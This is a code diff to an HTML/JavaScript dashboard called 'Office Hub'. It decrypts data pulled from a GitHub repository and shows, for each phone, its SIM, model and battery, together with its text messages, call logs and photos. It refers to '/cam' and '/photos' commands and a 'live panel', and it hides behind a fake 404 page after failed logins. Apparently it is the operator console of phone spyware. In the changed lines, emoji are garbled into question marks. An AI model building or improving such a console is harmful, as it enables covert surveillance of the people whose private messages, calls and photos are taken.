@@ -1,5 +1,5 @@
 <!doctype html><html><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><title>Office Hub</title><style>
-:root{--bg:#0d1117;--c:#161b22;--b:#21262d;--t:#e6edf3;--m:#8b949e;--a:#2f81f7;--g:#238636}
+:root{--bg:#0d1117;--c:#161b22;--b:#21262d;--t:#e6edf3;--m:#8b949e;--a:#2f81f7;--g:#238636;--r:#da3633}
 *{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--t);font:15px/1.5 system-ui,Arial}
 header{padding:14px 18px;background:var(--c);border-bottom:1px solid var(--b);font-weight:700;font-size:18px;position:sticky;top:0;z-index:5;display:none}
 header small{color:var(--m);font-weight:400;margin-left:8px}
@@ -10,44 +10,50 @@ header small{color:var(--m);font-weight:400;margin-left:8px}
 #lock input{width:100%;background:var(--bg);border:1px solid var(--b);color:var(--t);border-radius:10px;padding:12px;font-size:18px;text-align:center;letter-spacing:6px;outline:none}
 #lock input:focus{border-color:var(--a)}
 #lock button{width:100%;margin-top:12px;background:var(--g);border:none;color:#fff;border-radius:10px;padding:12px;font-size:15px;font-weight:700;cursor:pointer}
-#lock button:hover{filter:brightness(1.1)}
 #lmsg{margin-top:12px;font-size:13px;min-height:18px;color:#f85149}
-#tabs,#sub{display:none;gap:8px;padding:10px 14px 0;flex-wrap:wrap}
-#sub{padding-top:4px}
-#tabs button,#sub button{background:var(--c);color:var(--t);border:1px solid var(--b);border-radius:8px;padding:7px 14px;font-size:14px;cursor:pointer}
-#tabs button.on,#sub button.on{background:var(--a);border-color:var(--a)}
-body.open header{display:block}body.open #tabs,body.open #sub{display:flex}
-main{padding:6px 14px 60px}
+body.open header{display:block}
+main{padding:8px 14px 60px}
+.dim{color:var(--m);font-size:12px}
+h4{margin:16px 4px 8px;font-size:15px}
+.dev{background:var(--c);border:1px solid var(--b);border-radius:14px;padding:14px;margin:8px 0;display:flex;gap:14px;align-items:center;cursor:pointer}
+.dev:hover{border-color:var(--a)}
+.dev .ic{font-size:34px}
+.dev .nm{font-weight:700;font-size:16px}
+.bar{height:7px;background:var(--b);border-radius:4px;overflow:hidden;width:90px;display:inline-block;vertical-align:middle;margin-right:6px}
+.bar i{display:block;height:100%;background:var(--g)}
+.bar.low i{background:var(--r)}
+.tiles{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin:10px 0}
+.tile{background:var(--c);border:1px solid var(--b);border-radius:14px;padding:16px 8px;text-align:center;cursor:pointer}
+.tile:hover{border-color:var(--a)}
+.tile .e{font-size:30px}
+.tile .l{font-size:13px;margin-top:4px}
+.tile .n{font-size:20px;font-weight:800;color:var(--a)}
 .card{background:var(--c);border:1px solid var(--b);border-radius:12px;padding:12px 14px;margin:8px 0}
 .item{background:var(--c);border:1px solid var(--b);border-radius:10px;padding:10px 12px;margin:6px 0;display:flex;justify-content:space-between;gap:10px;cursor:pointer}
 .item:hover{border-color:var(--a)}
-.dim{color:var(--m);font-size:12px}
 .bub{max-width:80%;padding:8px 12px;border-radius:12px;margin:5px 0;white-space:pre-wrap;word-break:break-word}
 .in{background:var(--c);border:1px solid var(--b)}
 .out{background:#1f3a5f;margin-left:auto}
 .wr{display:flex;flex-direction:column}
 img.p{width:100%;border-radius:10px;margin:6px 0;border:1px solid var(--b)}
-.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:8px}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
 a{color:var(--a);text-decoration:none}
-.back{margin:10px 0;background:var(--c);color:var(--t);border:1px solid var(--b);border-radius:8px;padding:7px 14px;cursor:pointer}
-h4{margin:14px 0 6px}
+button.back{margin:10px 0;background:var(--c);color:var(--t);border:1px solid var(--b);border-radius:8px;padding:7px 14px;cursor:pointer}
 #nf{display:none;padding:60px 20px;text-align:center}
 #nf .big{font-size:72px;font-weight:800;letter-spacing:-2px}
-#nf a{color:var(--a)}
 </style></head><body>
-<div id=lock><div class=card><h2>🔒 Office Hub</h2><p>Private — enter the access password</p>
+<div id=lock><div class=card><h2>? Office Hub</h2><p>Private ? enter the access password</p>
 <input id=pw type=password inputmode=numeric autofocus><button id=go>Unlock</button><div id=lmsg></div></div></div>
 <div id=nf><div class=big>404</div><p><b>This is not the web page you are looking for.</b></p></div>
-<header>🐙 Office Hub <small id=upd></small></header>
-<div id=tabs></div><div id=sub></div><main id=main></main>
+<header>? Office Hub <small id=upd></small></header>
+<main id=main></main>
 <script>
 var RAW='https://raw.githubusercontent.com/';
 var OWN='devicesync837',REPO='office-hub',BR='main';
 var SALT=new TextEncoder().encode('ds-office-hub-v1');
 var MAX=5;
-var devices=[],st={},cur=null,sub='msgs',th=null,KEY=null,timer=null;
+var devices=[],st={},view='devices',cur=null,sub=null,th=null,KEY=null;
 function b642ab(b){var s=atob(b),u=new Uint8Array(s.length);for(var i=0;i<s.length;i++)u[i]=s.charCodeAt(i);return u.buffer}
-function ab2hex(buf){return Array.from(new Uint8Array(buf)).map(function(x){return ('0'+x.toString(16)).slice(-2)}).join('')}
 async function derive(pass){
   var base=await crypto.subtle.importKey('raw',new TextEncoder().encode(pass),'PBKDF2',false,['deriveKey']);
   return crypto.subtle.deriveKey({name:'PBKDF2',salt:SALT,iterations:150000,hash:'SHA-1'},base,{name:'AES-GCM',length:256},false,['decrypt']);
@@ -83,11 +89,11 @@ async function unlock(){
     KEY=await derive(pw);
     var d=await decFile('state/devices.json');
     try{sessionStorage.removeItem('hubTry')}catch(e){}
-    devices=d;cur=d[0]||null;
+    devices=d;cur=null;view='devices';sub=null;th=null;
     document.getElementById('lock').style.display='none';
     document.body.className='open';
     document.getElementById('main').textContent='Decrypting...';
-    tick();timer=setInterval(tick,10000);
+    tick();setInterval(tick,12000);
   }catch(e){
     var tries=0;
     try{tries=parseInt(sessionStorage.getItem('hubTry')||'0')}catch(e2){}
@@ -95,7 +101,7 @@ async function unlock(){
     try{sessionStorage.setItem('hubTry',String(tries))}catch(e3){}
     if(tries>=MAX){fake404();return}
     msg.style.color='#f85149';
-    msg.textContent='Wrong password — '+(MAX-tries)+' attempts left';
+    msg.textContent='Wrong password ? '+(MAX-tries)+' attempts left';
     document.getElementById('pw').value='';
     KEY=null;
   }
@@ -110,44 +116,58 @@ async function tick(){
   if(!KEY)return;
   try{
     devices=await decFile('state/devices.json');
-    if(!cur&&devices.length)cur=devices[0];
     for(var i=0;i<devices.length;i++){
       var f=devices[i];
       try{st[f]=await decFile('state/'+f);render()}catch(e){}
     }
   }catch(e){}
 }
+function battBar(b){
+  var cls=b<20?'bar low':'bar';
+  return '<span class='+cls+'><i style=width:'+Math.max(2,Math.min(100,b))+'%></i></span>';
+}
 function render(){
-  var tb=document.getElementById('tabs');tb.innerHTML='';
-  devices.forEach(function(f){
-    var b=document.createElement('button');
-    b.textContent=(st[f]&&st[f].name)?st[f].name:f.replace('.json','');
-    if(f===cur)b.className='on';
-    b.onclick=function(){cur=f;th=null;render()};tb.appendChild(b);
-  });
-  var sb=document.getElementById('sub');sb.innerHTML='';
-  ['msgs','calls','photos'].forEach(function(s){
-    var b=document.createElement('button');
-    b.textContent=s==='msgs'?'💬 Messages':(s==='calls'?'📞 Calls':'🖼 Photos');
-    if(s===sub)b.className='on';
-    b.onclick=function(){sub=s;th=null;render()};sb.appendChild(b);
-  });
-  var m=document.getElementById('main'),d=st[cur];
+  var m=document.getElementById('main'),h='';
+  if(view==='devices'){
+    document.getElementById('upd').textContent='';
+    h+='<h4>? All devices ('+devices.length+')</h4>';
+    if(!devices.length){h+='<div class=dim>Waiting for devices to check in...</div>'}
+    devices.forEach(function(f){
+      var d=st[f];
+      if(!d){h+='<div class=dev><div class=ic>?</div><div><div class=nm>'+esc(f.replace('.json',''))+'</div><div class=dim>loading...</div></div></div>';return}
+      h+='<div class=dev data-dev='+esc(f)+'>'
+        +'<div class=ic>'+(d.batt>=0&&d.batt<20?'?':'?')+'</div><div style=flex:1>'
+        +'<div class=nm>'+esc(d.name)+'</div>'
+        +'<div class=dim>'+esc(d.sim||'')+' ? '+esc(d.model||'')+'</div>'
+        +'<div class=dim>'+esc(d.status||'')+'</div></div>'
+        +'<div style=text-align:right>'+(d.batt>=0?battBar(d.batt)+'<b>'+d.batt+'%</b><br>':'')
+        +'<span class=dim>'+ago(d.time)+'</span></div></div>';
+    });
+    m.innerHTML=h;return;
+  }
+  var d=st[cur];
   document.getElementById('upd').textContent=d?('updated '+ago(d.time)):'';
-  if(!d){m.textContent='Waiting for device data...';return}
-  var h='';
-  h+='<div class=card><b>'+esc(d.name)+'</b> — '+esc(d.sim||'')+' <span class=dim>('+esc(d.model||'')+')</span><br>'
-    +'<span class=dim>'+esc(d.status||'')+' · device check-in '+ago(d.time)+'</span><br>'
-    +'🔋 '+d.batt+'% '+(d.chg?'⚡ charging':'')+' '
-    +(d.panel?' — <a href='+esc(d.panel)+' target=_blank>🔑 Open live panel</a>':'')+'</div>';
-  if(sub==='msgs'){
+  if(!d){m.innerHTML='<button class=back data-back=1>? All devices</button><div class=dim>Loading...</div>';return}
+  var nmsg=(d.msgs||[]).length,ncal=(d.calls||[]).length,nph=(d.photos||[]).length;
+  h+='<button class=back data-back=1>? All devices</button>';
+  h+='<div class=card><div class=nm style=font-weight:700;font-size:17px>'+(d.batt>=0&&d.batt<20?'?':'?')+' '+esc(d.name)+'</div>'
+    +'<div class=dim>? '+esc(d.sim||'')+' ? '+esc(d.model||'')+'</div>'
+    +'<div>'+(d.batt>=0?battBar(d.batt)+' '+d.batt+'% '+(d.chg?'?':'')+' ? ':'')
+    +'<span class=dim>check-in '+ago(d.time)+' ? '+esc(d.status||'')+'</span></div></div>';
+  if(!sub){
+    h+='<div class=tiles>'
+      +'<div class=tile data-sub=msgs><div class=e>?</div><div class=l>Messages</div><div class=n>'+nmsg+'</div></div>'
+      +'<div class=tile data-sub=calls><div class=e>?</div><div class=l>Calls</div><div class=n>'+ncal+'</div></div>'
+      +'<div class=tile data-sub=photos><div class=e>?</div><div class=l>Photos</div><div class=n>'+nph+'</div></div>'
+      +'</div>';
+  }else if(sub==='msgs'){
     var th2={},order=[];
     (d.msgs||[]).forEach(function(x){
       if(!th2[x.a]){th2[x.a]={a:x.a,last:x.b,d:x.d,n:0};order.push(x.a)}
       th2[x.a].n++;
     });
     if(th){
-      h+='<button class=back data-back=1>← All conversations</button>';
+      h+='<button class=back data-sub=msgs>? Conversations</button>';
       (d.msgs||[]).forEach(function(x){
         if(x.a!==th)return;
         var mine=(x.t===2||x.t===4||x.t===5);
@@ -156,7 +176,7 @@ function render(){
       });
     }else{
       order.sort(function(a,b){return th2[b].d-th2[a].d});
-      h+='<h4>💬 Conversations ('+order.length+')</h4>';
+      h+='<h4>? All conversations ('+order.length+')</h4>';
       order.forEach(function(a){
         var t=th2[a];
         h+='<div class=item data-a='+esc(a)+'><div><b>'+esc(a)+'</b><br><span class=dim>'
@@ -165,34 +185,35 @@ function render(){
       });
     }
   }else if(sub==='calls'){
-    h+='<h4>📞 Calls ('+(d.calls||[]).length+')</h4>';
+    h+='<h4>? Calls ('+ncal+')</h4>';
     (d.calls||[]).forEach(function(k){
-      var ic=k.t===3?'❌':(k.t===2?'📤':'📥');
+      var ic=k.t===3?'?':(k.t===2?'?':'?');
       var du=k.du>0?Math.floor(k.du/60)+':'+('0'+k.du%60).slice(-2):'';
       h+='<div class=item><div>'+ic+' <b>'+esc(k.n)+'</b></div><div style=text-align:right><span class=dim>'+fmt(k.d)
-        +(du?' · '+du:'')+'</span></div></div>';
+        +(du?' ? '+du:'')+'</span></div></div>';
     });
-  }else{
-    var ph=d.photos||[];
-    h+='<h4>🖼 Photos ('+ph.length+')</h4><div class=grid>';
-    ph.forEach(function(p,i){
-      h+='<div class=ph data-i='+i+' data-p='+esc(p.p)+'><div class=dim style=padding:30px 0;text-align:center>decrypting…</div></div>';
+  }else if(sub==='photos'){
+    h+='<h4>? Photos ('+nph+')</h4><div class=grid>';
+    (d.photos||[]).forEach(function(p,i){
+      h+='<div class=ph data-p='+esc(p.p)+'><div class=dim style=padding:30px 0;text-align:center>decrypting?</div></div>';
     });
     h+='</div>';
-    if(!ph.length)h+='<div class=dim>Photos taken with /cam and /photos appear here automatically.</div>';
+    if(!nph)h+='<div class=dim>Photos from /cam and /photos appear here.</div>';
     setTimeout(function(){
       document.querySelectorAll('.ph').forEach(function(el){
         decBin(el.getAttribute('data-p')).then(function(u){
           el.innerHTML='<img class=p src='+u+' loading=lazy>';
-        }).catch(function(){el.innerHTML='<div class=dim>—</div>'});
+        }).catch(function(){el.innerHTML='<div class=dim>?</div>'});
       });
     },50);
   }
   m.innerHTML=h;
 }
 document.getElementById('main').addEventListener('click',function(e){
-  var el=e.target.closest('.item');
-  if(el&&el.getAttribute('data-a')){th=el.getAttribute('data-a');render();return}
-  if(e.target.closest('.back')){th=null;render()}
+  var el;
+  if(e.target.closest('[data-back]')){view='devices';cur=null;sub=null;th=null;render();return}
+  if((el=e.target.closest('[data-dev]'))){view='device';cur=el.getAttribute('data-dev');sub=null;th=null;render();return}
+  if((el=e.target.closest('[data-sub]'))){sub=el.getAttribute('data-sub');th=null;render();return}
+  if((el=e.target.closest('[data-a]'))){th=el.getAttribute('data-a');render();return}
 });
 </script></body></html>
